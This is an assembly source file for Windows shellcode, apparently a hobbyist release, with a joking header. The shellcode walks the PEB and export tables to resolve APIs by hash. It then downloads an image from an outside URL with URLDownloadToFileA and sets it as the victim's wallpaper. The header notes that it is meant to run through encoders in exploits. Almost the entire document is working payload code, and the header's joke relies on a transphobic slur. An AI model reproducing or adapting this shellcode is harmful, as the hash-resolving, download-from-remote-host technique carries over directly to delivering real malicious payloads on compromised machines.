; Windows shellcode to download and set an image as your current background.
; The working name for this shellcode is "chinese-weiner-trap" (the model's
; name is China). Apologies to any trans-folk who come across this and get upset
; by the use of the word "trap"-- you gotta forgive me though, 'cause the name
; is too perfect considering the subject matter. :)
;
; 348 bytes, null bytes all over the place. Intended for use with encoders.
;
; Works on Windows 7, will ONLY WORK on Windows XP if the target URL is a BMP
; file. This is because of a quirk with Active Desktop (remember that shit?)
; and how it sets jpegs as backgrounds. Windows 7 is a honeybadger when it 
; comes to pictures as backgrounds. It's untested on Windows XP, though, so
; YMMV.
;
; Have fun. :)
;
; frank2 <frank2 (.) dc949 (.) org>

      global main

_main:
      jmp   dataOffset

getFuncByHash:
      mov   esi,[esp+8]
      mov   edi,[esi+0x3C]       ; dos->e_lfanew 
      add   edi,esi
      mov   ecx,[edi+0x78]       ; export data 
      add   ecx,esi
      mov   ebx,[ecx+0x20]       ; AddressOfNames 
      add   ebx,esi
      xor   eax,eax
      push  ecx

searchForFunc:
      mov   edx,[ebx+eax*4]
      add   edx,esi
      mov   edi,0x554E4441

hashString:
      movzx ecx,byte [edx]
      test  ecx,ecx
      jz    short finishHash

rolRolFightDaPowa:
      xor   edi,ecx
      rol   edi,cl
      shr   ecx,1
      jnz   short rolRolFightDaPowa
      inc   edx
      jmp   short hashString

finishHash:
      or    edi,0x10101010
      cmp   edi,[esp+8]
      jz    short foundHash
      inc   eax
      jmp   short searchForFunc

foundHash:
      pop   ebx
      mov   edi,[ebx+0x1c]
      add   edi,esi
      mov   ebx,[ebx+0x24]
      add   ebx,esi
      movzx ebx,word [ebx+eax*2]
      mov   ebx,[edi+ebx*4]
      add   ebx,esi
      pop   eax               ; fix the stack 
      pop   edx               ; no idea why I did it this way 
      pop   edx               ; but I had some reason... 
      push  eax               ; it had to do with null bytes 
      ret                        

beginCode:
      pop   ebp
      xor   ecx,ecx
      xor   ebx,ebx
      xor   eax,eax           ; zero value for stosb 
      mov   cx,260
      mov   bl,90             ; 90 is a nice round number after our code 
      lea   edi,[ebp+ebx]
      repne stosb             ; zero buffers for our new filename 

      mov   esi,[fs:ecx+0x30]
      mov   esi,[esi+0xC]
      mov   esi,[esi+0xC]
      mov   esi,[esi]
      push  esi
      push  dword [esi+0x18]  ; ntdll 
      push  dword [ebp]       ; RtlExitUserThread hash 
      call  getFuncByHash
      mov   [ebp],ebx         ; RtlExitUserThread 

      pop   esi
      mov   esi,[esi]
      push  dword [esi+0x18]
      push  dword [esp]       ; kernel32 
      push  dword [ebp+4]     ; LoadLibraryA hash 
      call  getFuncByHash
      mov   [ebp+4],ebx       ; LoadLibraryA 

      push  dword [esp]       ; kernel32 
      push  dword [ebp+8]     ; GetTempPathA hash 
      call  getFuncByHash
      mov   [ebp+8],ebx       ; GetTempPathA 

      lea   eax,[ebp+20]
      push  eax
      call  [ebp+4]           ; load urlmon.dll 
      push  eax               ; urlmon.dll 
      push  dword [ebp+0xC]   ; URLDownloadToFileA hash 
      call  getFuncByHash
      mov   [ebp+0xC],ebx     ; URLDownloadToFileA 

      lea   eax,[ebp+31]
      push  eax
      call  [ebp+4]           ; load user32.dll 
      push  eax               ; user32.dll 
      push  dword [ebp+0x10]  ; SystemParametersInfoA hash 
      call  getFuncByHash
      mov   [ebp+0x10],ebx    ; SystemParametersInfoA 

      lea   edi,[ebp+90]
      push  edi               ; for later down 
      push  edi
      mov   cx,260
      push  ecx
      call  [ebp+8]           ; GetTempPathA 
      add   edi,eax
      lea   esi,[ebp+61]

copyLoop:
      movzx ecx,byte [esi]
      mov   byte [edi],cl
      inc   edi
      inc   esi
      test  ecx,ecx
      jnz   short copyLoop

      push  ecx
      push  ecx
      push  dword [esp+8]     ; our new filename :) 
      lea   eax,[ebp+42]
      push  eax
      push  ecx
      call  [ebp+0xC]         ; URLDownloadToFileA 

      push  3                 ; SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE 
      push  dword [esp+4]     ; our lovely lady again 
      push  eax               ; should be zero from URLDownloadToFile call 
      push  0x14              ; SPI_SETDESKWALLPAPER 
      call  [ebp+0x10]        ; SystemParametersInfoA 

      push  eax
      call  [ebp]             ; RtlExitUserThread 

dataOffset:
      call  beginCode

      dd    0x795D941E        ; RtlExitUserThread
      dd    0xF816FF93        ; LoadLibraryA
      dd    0x1A9CB85B        ; GetTempPathA
      dd    0xDE59B5BE        ; URLDownloadToFileA
      dd    0x1B7050F9        ; SystemParametersInfoA
      db    'urlmon.dll',0
      db    'user32.dll',0
      db    'http://i.imgur.com/enWo9.jpg',0
